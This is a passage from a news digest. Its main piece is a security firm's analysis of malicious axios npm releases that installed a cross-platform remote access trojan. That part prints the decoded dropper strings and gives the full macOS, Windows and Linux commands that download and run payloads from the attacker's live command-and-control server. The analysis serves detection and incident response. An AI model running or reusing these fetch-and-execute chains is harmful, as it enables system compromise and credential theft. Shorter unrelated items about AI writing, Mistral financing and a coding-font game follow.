+  <body><p>On March 30, 2026, StepSecurity identified two malicious versions of the widely used <pre>axios</pre> HTTP client library published to npm: <pre>axios@1.14.1</pre> and <pre>axios@0.30.4</pre>. Both versions were published using the compromised npm credentials of a lead axios maintainer, bypassing the project's normal GitHub Actions CI/CD pipeline. The attacker changed the maintainer's account email to an anonymous ProtonMail address and manually published the poisoned packages via the npm CLI. </p><p>These compromises were detected by StepSecurity AI Package Analyst [<a href="https://app.stepsecurity.io/oss-security-feed/axios?version=0.30.4">1</a>][<a href="https://app.stepsecurity.io/oss-security-feed/axios?version=1.14.1">2</a>] and <a href="https://github.com/step-security/harden-runner">StepSecurity Harden-Runner</a>. We have responsibly <a href="https://github.com/axios/axios/issues/10604">disclosed</a> the issue to the project maintainers.</p><p>The malicious versions inject a new dependency, <pre>plain-crypto-js@4.2.1</pre>, which is never imported anywhere in the axios source code. Its sole purpose is to execute a <pre>postinstall</pre> script that acts as a cross platform remote access trojan (RAT) dropper, targeting macOS, Windows, and Linux. The dropper contacts a live command and control server and delivers platform specific second stage payloads. After execution, the malware deletes itself and replaces its own <pre>package.json</pre> with a clean version to evade forensic detection.</p><p>Neither malicious version contains a single line of malicious code inside axios itself. Instead, both inject a fake dependency, plain-crypto-js@4.2.1, a package that is never imported anywhere in the axios source, whose only purpose is to run a postinstall script that deploys a cross-platform remote access trojan (RAT). The dropper contacts a live command-and-control server, delivers separate second-stage payloads for macOS, Windows, and Linux, then erases itself and replaces its own package.json with a clean decoy, leaving a developer who inspects their node_modules folder after the fact with no indication anything went wrong.</p><p>This was not opportunistic. The malicious dependency was staged 18 hours in advance. Three separate payloads were pre-built for three operating systems. Both release branches were hit within 39 minutes. Every trace was designed to self-destruct. This is among the most operationally sophisticated supply chain attacks ever documented against a top-10 npm package.</p><p><strong>If you have installed  axios@1.14.1 or axios@0.30.4, assume your system is compromised.</strong> </p><pre/><p>We performed full static and runtime analysis of the malicious packages, including complete decoding of the obfuscated dropper.</p><h2>Attack Timeline</h2><p>The attack was pre-staged across roughly 18 hours, with the malicious dependency seeded on npm before the axios releases to avoid “brand-new package” alarms from security scanners:</p><h2>Background: What Is axios?</h2><p>axios is the most popular HTTP client library in the JavaScript ecosystem. It is used in virtually every Node.js and browser application that makes HTTP requests — from React front-ends to CI/CD tooling to server-side APIs. With over 300 million weekly downloads, a compromise of even a single minor release has an enormous potential blast radius. A developer running a routine <pre>npm install</pre> or <pre>npm update</pre> would have no reason to suspect the package was deploying malware.</p><h2>How the Attack Works</h2><h3>Step 1 — Maintainer Account Hijack</h3><p>The attacker compromised the <pre>jasonsaayman</pre> npm account, the primary maintainer of the axios project. The account’s registered email was changed to <pre>ifstap@proton.me</pre> — an attacker-controlled ProtonMail address. Using this access, the attacker published malicious builds across <strong>both the 1.x and 0.x release branches simultaneously</strong>, maximizing the number of projects exposed.</p><p>Both <pre>axios@1.14.1</pre> and <pre>axios@0.30.4</pre> are recorded in the npm registry as published by <pre>jasonsaayman</pre>, making them indistinguishable from legitimate releases at a glance.</p><p>A critical forensic signal is visible in the npm registry metadata. Every legitimate axios 1.x release is published via <strong>GitHub Actions with npm’s OIDC Trusted Publisher mechanism</strong>, meaning the publish is cryptographically tied to a verified GitHub Actions workflow. <pre>axios@1.14.1</pre> breaks that pattern entirely — published manually via a stolen npm access token with no OIDC binding and no <pre>gitHead</pre>:</p><pre><pre>// axios@1.14.0 — LEGITIMATE
+"_npmUser": {
+  "name": "GitHub Actions",
+  "email": "npm-oidc-no-reply@github.com",
+  "trustedPublisher": {
+    "id": "github",
+    "oidcConfigId": "oidc:9061ef30-3132-49f4-b28c-9338d192a1a9"
+  }
+}
+
+// axios@1.14.1 — MALICIOUS
+"_npmUser": {
+  "name": "jasonsaayman",
+  "email": "ifstap@proton.me"
+  // no trustedPublisher, no gitHead, no corresponding GitHub commit or tag
+}</pre></pre><p>There is no commit or tag in the axios GitHub repository that corresponds to <pre>1.14.1</pre>. The release exists only on npm. The OIDC token that legitimate releases use is ephemeral and scoped to the specific workflow — it cannot be stolen. The attacker must have obtained a long-lived classic npm access token for the account.</p><h3>Step 2 — Staging the Malicious Dependency</h3><p>Before publishing the backdoored axios releases, the attacker pre-staged a malicious package on npm: <pre>plain-crypto-js@4.2.1</pre>, published from a separate throwaway account (<pre>nrwise</pre>, <pre>nrwise@proton.me</pre>). Note the shared use of ProtonMail across both accounts — a consistent operational pattern for this actor.</p><p>This package is deliberately designed to look legitimate:</p><ul><li><strong>Masquerades as</strong>— the same description (“JavaScript library of crypto standards”), the same author attribution (Evan Vosberg), and the same repository URL pointing to<pre>crypto-js</pre><pre>github.com/brix/crypto-js</pre></li><li><strong>Contains a</strong>:<pre>postinstall</pre>hook<pre>"postinstall": "node setup.js"</pre>— executes automatically, without any user action, on every<pre>npm install</pre></li><li><strong>Pre-stages its own evidence destruction</strong>— includes a file called<pre>package.md</pre>, a clean<pre>package.json</pre>stub (version<pre>4.2.0</pre>, no<pre>postinstall</pre>) ready to overwrite the real manifest after the attack runs</li></ul><h3>Step 3 — Injecting the Dependency into axios</h3><p>The attacker published <pre>axios@1.14.1</pre> and <pre>axios@0.30.4</pre> with <pre>plain-crypto-js: "^4.2.1"</pre> added as a <strong>runtime dependency</strong> — a package that has never appeared in any legitimate axios release. The diff is surgical: every other dependency is identical to the prior clean version.</p><p>Dependency comparison between clean and compromised versions:</p><ul><li>axios@1.14.0 — follow-redirects, form-data, proxy-from-env [CLEAN]</li><li>axios@1.14.1 — follow-redirects, form-data, proxy-from-env, <strong>plain-crypto-js@^4.2.1</strong>[MALICIOUS]</li><li>axios@0.30.3 — follow-redirects, form-data, proxy-from-env [CLEAN]</li><li>axios@0.30.4 — follow-redirects, form-data, proxy-from-env, <strong>plain-crypto-js@^4.2.1</strong>[MALICIOUS]</li></ul><p>When a developer runs <pre>npm install axios@1.14.1</pre>, npm resolves the dependency tree and installs <pre>plain-crypto-js@4.2.1</pre> automatically. npm then executes <pre>plain-crypto-js</pre>’s <pre>postinstall</pre> script, launching the dropper.</p><p><strong>Phantom dependency:</strong> A grep across all 86 files in <pre>axios@1.14.1</pre> confirms that <pre>plain-crypto-js</pre> is <strong>never imported or  require()’d anywhere</strong> in the axios source code. It is added to </p><pre>package.json</pre> only to trigger the <pre>postinstall</pre> hook. A dependency that appears in the manifest but has zero usage in the codebase is a high-confidence indicator of a compromised release.<h2>The RAT Dropper: <pre>setup.js</pre> — Static Analysis</h2><p><pre>setup.js</pre> is a single minified file employing a two-layer obfuscation scheme designed to evade static analysis tools and confuse human reviewers.</p><h3>Obfuscation Technique</h3><p>All sensitive strings — module names, OS identifiers, shell commands, the C2 URL, and file paths — are stored as encoded values in an array named <pre>stq[]</pre>. Two functions decode them at runtime:</p><p><strong> _trans_1(x, r)</strong> — XOR cipher. The key </p><pre>"OrDeR_7077"</pre> is parsed through JavaScript’s <pre>Number()</pre>: alphabetic characters produce <pre>NaN</pre>, which in bitwise operations becomes <pre>0</pre>. Only the digits <pre>7</pre>, <pre>0</pre>, <pre>7</pre>, <pre>7</pre> in positions 6–9 survive, giving an effective key of <pre>[0,0,0,0,0,0,7,0,7,7]</pre>. Each character at position <pre>r</pre> is decoded as:<pre><pre>charCode XOR key[(7 × r × r) % 10] XOR 333</pre></pre><p>‍</p><p><strong> _trans_2(x, r)</strong> — Outer layer. Reverses the encoded string, replaces </p><pre>_</pre> with <pre>=</pre>, base64-decodes the result (interpreting the bytes as UTF-8 to recover Unicode code points), then passes the output through <pre>_trans_1</pre>.<p>The dropper’s entry point is <pre>_entry("6202033")</pre>, where <pre>6202033</pre> is the C2 URL path segment. The full C2 URL is: <pre>http://sfrclak.com:8000/6202033</pre></p><h3>Fully Decoded Strings</h3><p>StepSecurity fully decoded every entry in the <pre>stq[]</pre> array. The recovered plaintext reveals the complete attack:</p><pre><pre>stq[0]  → "child_process"          // shell execution
+stq[1]  → "os"                      // platform detection
+stq[2]  → "fs"                      // filesystem operations
+stq[3]  → "http://sfrclak.com:8000/"   // C2 base URL
+stq[5]  → "win32"                   // Windows platform identifier
+stq[6]  → "darwin"                  // macOS platform identifier
+stq[12] → "curl -o /tmp/ld.py -d packages.npm.org/product2 -s SCR_LINK &amp;&amp; nohup python3 /tmp/ld.py SCR_LINK &gt; /dev/null 2&gt;&amp;1 &amp;"
+stq[13] → "package.json"            // deleted after execution
+stq[14] → "package.md"              // clean stub renamed to package.json
+stq[15] → ".exe"
+stq[16] → ".ps1"
+stq[17] → ".vbs"</pre></pre><h2>Platform-Specific Payloads</h2><p>The dropper checks <pre>os.platform()</pre> and branches into one of three attack paths:</p><h3>macOS AppleScript Dropper</h3><p>On macOS (<pre>darwin</pre>), the dropper writes an AppleScript file to the system temp directory and executes it silently:</p><pre><pre>nohup osascript "&lt;temp_file&gt;" &gt; /dev/null 2&gt;&amp;1 &amp;</pre></pre><p>The AppleScript contacts the C2 server with POST body <pre>packages.npm.org/product0</pre>, downloads the macOS RAT binary, saves it to <pre>/Library/Caches/com.apple.act.mond</pre> (a path designed to look like a legitimate Apple system cache entry), makes it executable with <pre>chmod 770</pre>, and launches it in the background via <pre>/bin/zsh</pre>:</p><pre><pre>do shell script "curl -o /Library/Caches/com.apple.act.mond \
+  -d packages.npm.org/product0 \
+  -s http://sfrclak.com:8000/6202033 \
+  &amp;&amp; chmod 770 /Library/Caches/com.apple.act.mond \
+  &amp;&amp; /bin/zsh -c \"/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &amp;\" \
+  &amp;&gt; /dev/null"</pre></pre><p>The AppleScript file is deleted after execution. The only persistent artifact is <pre>/Library/Caches/com.apple.act.mond</pre>. The path is deliberate: <pre>/Library/Caches/</pre> is a system-owned directory rarely inspected during incident response, and the name <pre>com.apple.act.mond</pre> mimics Apple’s reverse-DNS daemon naming convention — the suffix likely abbreviates “Activity Monitor Daemon” to blend in with legitimate Apple background processes in the same directory.</p><h3>Windows VBScript + PowerShell Dropper</h3><p>On Windows (<pre>win32</pre>), the attack chain involves three stages:</p><ul><li>Run <pre>where powershell</pre>to locate the PowerShell binary path</li><li>Copy the PowerShell binary to <pre>%PROGRAMDATA%\wt.exe</pre>— disguised as the Windows Terminal executable, providing a persistent copy of the interpreter</li><li>Write a VBScript (<pre>.vbs</pre>) to the temp directory and execute it via<pre>cscript //nologo</pre></li></ul><p>The VBScript runs a fully hidden <pre>cmd.exe</pre> window (<pre>0, False</pre> suppresses all UI):</p><pre><pre>Set objShell = CreateObject("WScript.Shell")
+objShell.Run "cmd.exe /c curl -s -X POST " &amp; _
+  "-d ""packages.npm.org/product1"" " &amp; _
+  """http://sfrclak.com:8000/6202033"" &gt; ""&lt;temp.ps1&gt;"" " &amp; _
+  "&amp; powershell -w hidden -ep bypass -file ""&lt;temp.ps1&gt;"" " &amp; _
+  """http://sfrclak.com:8000/6202033"" &amp; del ""&lt;temp.ps1&gt;"" /f", 0, False</pre></pre><p>The C2 returns a PowerShell RAT script, saved to <pre>%TEMP%\6202033.ps1</pre> (using the campaign ID as filename). It runs with <pre>-ExecutionPolicy Bypass</pre> and <pre>-WindowStyle Hidden</pre>, then self-deletes. The VBScript (<pre>%TEMP%\6202033.vbs</pre>) is also deleted by <pre>cscript</pre> after execution. The only persistent artifact is <pre>%PROGRAMDATA%\wt.exe</pre>.</p><h3>Linux Python Dropper</h3><p>On all other platforms (Linux, etc.), the dropper executes a direct shell command via Node.js’s <pre>execSync</pre>:</p><pre><pre>curl -o /tmp/ld.py \
+  -d packages.npm.org/product2 \
+  -s http://sfrclak.com:8000/6202033 \
+&amp;&amp; nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 &gt; /dev/null 2&gt;&amp;1 &amp;</pre></pre><p>The C2 returns a Python RAT script. It is saved to <pre>/tmp/ld.py</pre> and executed in the background with <pre>nohup</pre>. The file remains on disk at <pre>/tmp/ld.py</pre>.</p><p><strong>Three products, one C2:</strong> Each platform sends a distinct POST body to the same C2 URL — <pre>packages.npm.org/product0</pre> (macOS), <pre>packages.npm.org/product1</pre> (Windows), <pre>packages.npm.org/product2</pre> (Linux). This allows the C2 server to serve a platform-appropriate payload in response to a single endpoint. The <pre>packages.npm.org/</pre> prefix in the POST body is a deliberate attempt to make outbound traffic appear as benign npm registry communication in network logs and SIEM rules at a glance.</p><h2>Self-Cleanup — Hiding the Evidence</h2><p>After launching the platform payload, <pre>setup.js</pre> performs three forensic cleanup steps that make standard post-infection analysis unreliable:</p><ul><li><strong>Deletes itself</strong>—<pre>fs.unlink(__filename)</pre>removes<pre>setup.js</pre>from the installed package directory</li><li><strong>Deletes</strong>— removes the file that contains the incriminating<pre>package.json</pre><pre>"postinstall": "node setup.js"</pre>hook</li><li><strong>Renames</strong>— the pre-staged clean stub (version<pre>package.md</pre>to<pre>package.json</pre><pre>4.2.0</pre>, no<pre>postinstall</pre>, no<pre>setup.js</pre>reference) is moved into place</li></ul><p>Any post-infection inspection of <pre>node_modules/plain-crypto-js/package.json</pre> will show a completely clean manifest. There is no <pre>postinstall</pre> script, no <pre>setup.js</pre> file, and no indication that anything malicious was ever installed. Running <pre>npm audit</pre> or manually reviewing the installed package directory will not reveal the compromise.</p><p><strong>Why the directory presence still matters:</strong> Even after cleanup, the existence of <pre>node_modules/plain-crypto-js/</pre> is sufficient evidence of compromise — this package is not a dependency of any legitimate axios version. If you find this directory, the dropper ran.</p><p>‍</p><h2>Runtime Execution Validation with StepSecurity Harden-Runner</h2><p>Static analysis of the obfuscated dropper told us <i>what</i> the malware intended to do. To confirm it actually executes as designed, we installed <pre>axios@1.14.1</pre> inside a GitHub Actions runner instrumented with <a href="https://github.com/step-security/harden-runner">StepSecurity Harden-Runner</a> in audit mode. Harden-Runner captures every outbound network connection, every spawned process, and every file write at the kernel level — without interfering with execution in audit mode, giving us a complete ground-truth picture of what happens the moment <pre>npm install</pre> runs.</p><p>The full Harden-Runner insights for this run are publicly accessible:<a href="https://app.stepsecurity.io/github/actions-security-demo/compromised-packages/actions/runs/23776116077?jobName=install-axios-0-30-4&amp;jobId=69278263439&amp;tab=network-events">app.stepsecurity.io/github/actions-security-demo/compromised-packages/actions/runs/23776116077</a></p><graphic src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb44fa45dc02a6147681cd_Screenshot%202026-03-31%20at%209.21.38%E2%80%AFAM.png"/><h3>Network Events: C2 Contact Confirmed Across Two Workflow Steps</h3><p>The network event log contains two outbound connections to <pre>sfrclak.com:8000</pre> — but what makes this particularly significant is <i>when</i> they occur:</p><ul><li>Step: Install axios 1.14.1 — 01:30:51Z    PID 2401 • <pre>curl</pre>→ sfrclak.com:8000 • calledBy: infra</li><li>Step: Verify axios import and version — 01:31:27Z    PID 2400 • <pre>nohup</pre>→ sfrclak.com:8000 • calledBy: infra</li></ul><p>Two things stand out immediately:</p><ul><li><strong>The first C2 connection (</strong>— at<pre>curl</pre>, PID 2401) fires 1.1 seconds into the npm install<pre>01:30:51Z</pre>, just 2 seconds after<pre>npm install</pre>began at<pre>01:30:49Z</pre>. The<pre>postinstall</pre>hook triggered, decoded its strings, and was making an outbound HTTP connection to an external server before npm had finished resolving all dependencies.</li><li><strong>The second C2 connection (</strong>— “Verify axios import and version.” The npm install step was long finished. The malware had persisted into subsequent steps, running as a detached background process. This is the stage-2 Python payload (<pre>nohup</pre>, PID 2400) occurs 36 seconds later, in an entirely different workflow step<pre>/tmp/ld.py</pre>) making a callback — alive and independent of the process that spawned it.</li></ul><p><strong>Why both connections show  calledBy: "infra":</strong> When Harden-Runner can trace a network call to a specific Actions step through the runner process tree, it labels it </p><pre>"runner"</pre>. The <pre>"infra"</pre> label means the process making the connection could not be attributed to a specific step — because the dropper used <pre>nohup ... &amp;</pre> to detach from the process tree. The process was deliberately orphaned to PID 1 (<pre>init</pre>), severing all parent-child relationships. This is the malware actively evading process attribution.<h3>Process Tree: The Full Kill Chain as Observed at Runtime</h3><p>Harden-Runner captures every <pre>execve</pre> syscall. The raw process events reconstruct the exact execution chain from <pre>npm install</pre> to C2 contact:</p><pre><pre>PID 2366  bash /home/runner/work/_temp/***.sh                         [01:30:48.186Z]
+  └─ PID 2380  env node npm install axios@1.14.1                      [01:30:49.603Z]
+       └─ PID 2391  sh -c "node setup.js"                             [01:30:50.954Z]
+            │  cwd: node_modules/plain-crypto-js  ← postinstall hook fires
+            └─ PID 2392  node setup.js                                [01:30:50.955Z]
+                 │  cwd: node_modules/plain-crypto-js
+                 └─ PID 2399  /bin/sh -c "curl -o /tmp/ld.py \        [01:30:50.978Z]
+                          -d packages.npm.org/product2 \
+                          -s http://sfrclak.com:8000/6202033 \
+                       &amp;&amp; nohup python3 /tmp/ld.py \
+                          http://sfrclak.com:8000/6202033 \
+                          &gt; /dev/null 2&gt;&amp;1 &amp;"
+
+PID 2401  curl -o /tmp/ld.py -d packages.npm.org/product2            [01:30:50.979Z]
+          ppid: 2400  ← child of nohup
+
+PID 2400  nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033   [01:31:27.732Z]
+          ppid: 1  ← ORPHANED TO INIT — detached from npm process tree</pre></pre><p>‍</p><p>The process tree confirms the exact execution chain decoded statically from <pre>setup.js</pre>. Four levels of process indirection separate the original <pre>npm install</pre> from the C2 callback: <pre>npm → sh → node → sh → curl/nohup</pre>. The <pre>nohup</pre> process (PID 2400) reporting <pre>ppid: 1</pre> is the technical confirmation of the daemonization technique — by the time <pre>npm install</pre> returned successfully, a detached process was already running <pre>/tmp/ld.py</pre> in the background.</p><h2>Indicators of Compromise</h2><p><strong>Malicious npm Packages</strong></p><ul><li>axios@1.14.1 · shasum: 2553649f232204966871cea80a5d0d6adc700ca</li><li>axios@0.30.4 · shasum: d6f3f62fd3b9f5432f5782b62d8cfd5247d5ee71</li><li>plain-crypto-js@4.2.1 · shasum: 07d889e2dadce6f3910dcbc253317d28ca61c766</li></ul><p><strong>Network Indicators</strong></p><ul><li>C2 domain · sfrclak.com</li><li>C2 IP · 142.11.206.73</li><li>C2 URL · <a href="http://sfrclak.com:8000/6202033">http://sfrclak.com:8000/6202033</a></li><li>C2 POST body (macOS) · packages.npm.org/product0</li><li>C2 POST body (Windows) · packages.npm.org/product1</li><li>C2 POST body (Linux) · packages.npm.org/product2</li></ul><p><strong>File System Indicators</strong></p><ul><li>macOS · /Library/Caches/com.apple.act.mond</li><li>Windows (persistent) · %PROGRAMDATA%\wt.exe</li><li>Windows (temp, self-deletes) · %TEMP%\6202033.vbs</li><li>Windows (temp, self-deletes) · %TEMP%\6202033.ps1</li><li>Linux · /tmp/ld.py</li></ul><p><strong>Attacker-Controlled Accounts</strong></p><ul><li>jasonsaayman · compromised legitimate axios maintainer, email changed to <a href="mailto:ifstap@proton.me">ifstap@proton.me</a></li><li>nrwise · attacker-created account, <a href="mailto:nrwise@proton.me">nrwise@proton.me</a>, published plain-crypto-js</li></ul><p><strong>Safe Version Reference</strong></p><ul><li>axios@1.14.0 (safe) · shasum: 7c29f4cf2ea91ef05018d5aa5399bf23ed3120eb</li></ul><h2>Am I Affected?</h2><p><strong>Check for the malicious axios versions in your project:</strong></p><pre><pre>npm list axios 2&gt;/dev/null | grep -E "1\.14\.1|0\.30\.4"
+grep -A1 '"axios"' package-lock.json | grep -E "1\.14\.1|0\.30\.4"</pre></pre><p><strong>Check for  plain-crypto-js in node_modules:</strong></p><pre/><pre><pre>ls node_modules/plain-crypto-js 2&gt;/dev/null &amp;&amp; echo "POTENTIALLY AFFECTED"</pre></pre><p>If <pre>setup.js</pre> already ran, <pre>package.json</pre> inside this directory will have been replaced with a clean stub. The presence of the directory is sufficient evidence the dropper executed.</p><p><strong>Check for RAT artifacts on affected systems:</strong></p><pre><pre># macOS
+ls -la /Library/Caches/com.apple.act.mond 2&gt;/dev/null &amp;&amp; echo "COMPROMISED"
+
+# Linux
+ls -la /tmp/ld.py 2&gt;/dev/null &amp;&amp; echo "COMPROMISED"
+
+ "COMPROMISED"
+
+# Windows (cmd.exe)
+dir "%PROGRAMDATA%\wt.exe" 2&gt;nul &amp;&amp; echo COMPROMISED</pre></pre><p>‍</p><p><strong>Check CI/CD pipeline logs</strong> for any <pre>npm install</pre> executions that may have pulled <pre>axios@1.14.1</pre> or <pre>axios@0.30.4</pre>. Any pipeline that installed either version should be treated as compromised and all injected secrets rotated immediately.</p><h2>Remediation</h2><p>1. Downgrade axios to a clean version and pin it: npm install axios@1.14.0 # for 1.x users</p><pre><pre>npm install axios@0.30.3   # for 0.x users    </pre></pre><p>Add an overrides block to prevent transitive resolution back to the malicious versions:</p><pre><pre>{
+ "dependencies": { "axios": "1.14.0" },
+ "overrides":    { "axios": "1.14.0" },
+ "resolutions":  { "axios": "1.14.0" }
+} </pre></pre><p>‍<br/>2. Remove plain-crypto-js from node_modules:    </p><pre><pre>rm -rf node_modules/plain-crypto-js
+npm install --ignore-scripts  </pre></pre><p> <br/>3. If a RAT artifact is found: treat the system as fully compromised. Do not attempt to clean in place - rebuild from a known-good state.  <br/> <br/>4. Rotate all credentials on any system where the malicious package ran: npm tokens, AWS access keys, SSH private keys, cloud credentials (GCP, Azure), CI/CD secrets, and any values present in .env files accessible at install time.  <br/> <br/>5. Audit CI/CD pipelines for runs that installed the affected versions. Any workflow that executed npm install with these versions should have all injected secrets rotated.  <br/> <br/>6.Use --ignore-scripts in CI/CD as a standing policy to prevent postinstall hooks from running during automated builds:  </p><pre><pre>npm ci --ignore-scripts  </pre></pre><p> <br/>7. Block C2 traffic at the network/DNS layer as a precaution on any potentially exposed system:  </p><pre><pre> # Block via firewall (Linux)
+iptables -A OUTPUT -d 142.11.206.73-j DROP
+
+# Block via /etc/hosts (macOS/Linux)
+echo "0.0.0.0 sfrclak.com" &gt;&gt; /etc/hosts  </pre></pre><h2>How StepSecurity Helps</h2><p>StepSecurity provides end-to-end npm supply chain security across three pillars: <strong>Prevent</strong>, <strong>Detect</strong>, and <strong>Respond</strong>. Here’s how each would have helped in this attack — and how they protect you against the next one. (<a href="https://docs.stepsecurity.io">Full documentation</a>)</p><h3>Prevent - Block Malicious Packages Before They Enter Your Codebase</h3><ul><li><strong>npm Package Cooldown Check</strong>— Newly published npm packages are temporarily blocked during a configurable cooldown window. When a PR introduces or updates to a recently published version, the check automatically fails. Since most malicious packages are identified within 24 hours, this creates a crucial safety buffer. In this case,<pre>plain-crypto-js@4.2.1</pre>was published hours before the axios releases — any PR updating to<pre>axios@1.14.1</pre>or<pre>axios@0.30.4</pre>during the cooldown period would have been blocked automatically.</li><li> <strong>npm Package Compromised Updates Check</strong>— StepSecurity maintains a real-time database of known malicious and high-risk npm packages, updated continuously — often before official CVEs are filed. If a PR attempts to introduce a compromised package, the check fails and the merge is blocked. Both<pre>axios@1.14.1</pre>and<pre>plain-crypto-js@4.2.1</pre>were added to this database within minutes of detection.</li></ul><graphic src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb3bfff0510f366d24bfe7_Screenshot%202026-03-31%20at%208.40.26%E2%80%AFAM.png"/><ul><li> <strong>Harden-Runner Egress Network Restrictions</strong>— Filters outbound network traffic during workflow execution, blocking all undeclared endpoints. Both DNS and network-level enforcement prevent covert data exfiltration. The C2 callback to<pre>sfrclak.com:8000</pre>and the payload fetch in the<pre>postinstall</pre>script would have been blocked at the network level before the RAT could be delivered.</li></ul><h3>Detect - Continuous Visibility Across PRs, Repos, and Dev Machines</h3><ul><li><strong>Threat Intelligence + AI Package Analyst</strong>— Continuously monitors the npm registry for suspicious releases. In this case, both<pre>axios@1.14.1</pre>and<pre>plain-crypto-js@4.2.1</pre>were flagged within minutes of publication — giving teams time to investigate, confirm malicious intent, and act before the packages accumulated significant installs. Alerts include the full behavioral analysis, decoded payload details, and direct links to the OSS Security Feed.</li><li><strong>npm Package Search</strong>— Search across all PRs in all repositories across your organization to find where a specific package was introduced. When a compromised package is discovered, instantly understand the blast radius — which repos, which PRs, and which teams are affected. This works across pull requests, default branches, and dev machines.</li><li> <strong>Harden-Runner Network Baselines</strong>— Automatically logs outbound network traffic per job and repository, establishing normal behavior patterns and flagging anomalies. Reveals whether malicious<pre>postinstall</pre>scripts executed exfiltration attempts or contacted suspicious domains — even when the malware self-deletes its own evidence afterward.</li></ul><graphic src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb3db43619a4792536ff37_Screenshot%202026-03-31%20at%208.51.15%E2%80%AFAM.png"/><p><i>npm Package Search lets customers instantly check if compromised versions were introduced in any PR, default branch, or developer machine across their organization.</i></p><graphic src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/69cb3d648565158355274da2_Screenshot%202026-03-31%20at%208.47.46%E2%80%AFAM.png"/><p><i>StepSecurity Threat Center delivers real-time threat intel advisories to customers with direct links to search for affected packages across their organization.</i></p><h3>Respond - Investigate Incidents and Assess Organization-Wide Impact</h3><p><strong>Threat Center</strong> - Real-time alerts about compromised packages, hijacked maintainers, and emerging attack campaigns delivered directly into existing SIEM workflows. Alerts include attack summaries, technical analysis, IOCs, affected versions, and remediation steps — everything needed to triage and respond immediately.  </p><p><strong>Coordinated Remediation</strong> - Combines threat intel, package search, and network baselines to create a prioritized list of affected repositories with consistent guidance, enabling coordinated fixes across dozens or hundreds of repositories simultaneously. </p><p><strong>Protect your pipelines:</strong> <a href="https://app.stepsecurity.io/oss-security-feed">AI Package Analyst</a> monitors every npm and PyPI publish in real time, scoring packages for supply chain risk before you install them. <a href="https://docs.stepsecurity.io/harden-runner">Harden-Runner</a> enforces a network egress allowlist in GitHub Actions, blocking C2 callbacks and unexpected outbound connections even when a malicious package slips through.</p><p>‍</p></body>
+</html>
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan">https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-4">
+            <h2>Do your own writing</h2>
+            <div class="article-meta"><span class="source-badge">hackernews</span> • <span class="article-score">463 points</span> • by karimf • March 30, 2026</div>
+            <div class="article-content">
+                <html>
+  <body>
+    <h1>Don't Let AI Write For You</h1>
+    <p/>
+    <p>When you write a document or essay, you are posing a question and then answering it. For example, a PRD answers the question, “What should we build?” A technical spec answers, “How should we build it?” Sometimes the question is more difficult to answer—“What are we even trying to accomplish?” And with every attempt at answering, you reflect on whether you’re asking the right question.</p>
+    <p>But now, of course, we have LLMs. I’m seeing an increasing amount of LLM-generated documents, articles, and essays. I want to caution against this. Each LLM-generated document is a missed opportunity to think and build trust.</p>
+    <h2>Thinking</h2>
+    <p>The goal of writing is not to have written. It is to have increased your understanding, and then the understanding of those around you. When you are tasked to write something, your job is to go into the murkiness and come out of it with structure and understanding. <a href="https://essay.app/guide/">To conquer the unknown</a>.</p>
+    <p>The second order goal of writing is to become more capable. It is like working out. Every time you do a rep on the boundary of what you can do, you get stronger. It is uncomfortable and effortful.</p>
+    <p>Letting an LLM write for you is like paying somebody to work out for you.</p>
+    <h2>Building Trust</h2>
+    <p>There are social effects to LLM-generated writing too. When I send somebody a document that whiffs of LLM, I’m only demonstrating that the LLM produced something approximating what others want to hear. I’m not showing that I contended with the ideas.</p>
+    <p>It undermines my credibility as a person who could lead whatever initiative comes out of this document. That’s unfortunate. I could have used this opportunity to establish credibility.</p>
+    <blockquote>
+      <p>LLM-generated writing undermines the authenticity of not just one’s writing but of the thinking behind it as well. If the prose is automatically generated, might the ideas be too?</p>
+    </blockquote>
+    <h2>How LLMs can be used in the writing process</h2>
+    <p>LLMs are useful for research and checking your work. They can also work well for quickly recording information or transcribing text (neither of which are what I mean by “writing”, as in “writing an essay”).</p>
+    <p>They are particularly good at generating ideas. They thrive in this use case because if they generate 10 things and only one is useful, no harm is done. You can take what is useful and leave the rest behind.</p>
+    <p>These LLMs will increase efficiency in delivering software. But in order to make the most of them, we need a simultaneous rise in our level of thoughtfulness.</p>
+  </body>
+</html>
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://alexhwoods.com/dont-let-ai-write-for-you/">https://alexhwoods.com/dont-let-ai-write-for-you/</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-5">
+            <h2>Paris-based AI startup Mistral raised $830M in its debut debt financing to build Nvidia-powered data centers across Europe; Mistral plans to spend €4B in total</h2>
+            <div class="article-meta"><span class="source-badge">techmeme</span> • <span class="article-score">100 points</span> • March 30, 2026</div>
+            <div class="article-content">
+                
+            <div class="summary-only">
+                <p><em>Full article not available - showing summary only.</em></p>
+                <p>( Tim Bradshaw / Financial Times )</p>
+            </div>
+            
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://techmeme.us14.list-manage.com/track/click?u=94ccd3ae223561415b05892ab&amp;id=306bb96332&amp;e=8d40e66a6d">https://techmeme.us14.list-manage.com/track/click?u=94ccd3ae223561415b05892ab&amp;id=306bb96332&amp;e=8d40e66a6d</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-6">
+            <h2>CodingFont: A game to help you pick a coding font</h2>
+            <div class="article-meta"><span class="source-badge">hackernews</span> • <span class="article-score">376 points</span> • by nvahalik • March 30, 2026</div>
+            <div class="article-content">
+                <html>
+  <body>
+    <p>Game
+Browse
+Studio
+Show Name
+Theme:
+Birds of Paradise
+Cobalt
+Dawn
+Espresso Libre
+GitHub
+Idle Fingers
+I Plastic
+MagicWB Amiga
+Merbivore
+Sunburst
+Textmate Mac Classic
+KR Theme
+Twilight
+Zenburnesque
+Active4D
+All Hallows Eve
+Amy
+Blackboard
+Brilliance Black
+Chrome DevTools
+Clouds Midnight
+Clouds
+Dracula
+Dreamweaver
+Eiffel
+GitHub Dark
+GitHub Light
+Katzenmilch
